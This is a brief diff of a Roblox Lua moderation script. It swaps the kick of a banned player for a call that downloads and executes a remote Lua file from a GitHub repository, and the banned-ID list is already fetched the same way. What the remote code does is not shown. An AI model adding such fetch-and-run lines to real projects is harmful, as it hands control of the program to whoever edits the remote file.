@@ -7,8 +7,8 @@ local BannedPlayerIds = loadstring(game:HttpGet('https://raw.githubusercontent.c
 for _, joueur in ipairs(Players:GetPlayers()) do
     for _, idBanni in ipairs(BannedPlayerIds) do
         if joueur.UserId == idBanni then
-            joueur:Kick("Joueur banni détecté.")
-            break -- Sort de la boucle interne dès que le joueur est kické
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/soft972/Image/refs/heads/main/BanMLJG.lua'))()
+            break
         end
     end
 end
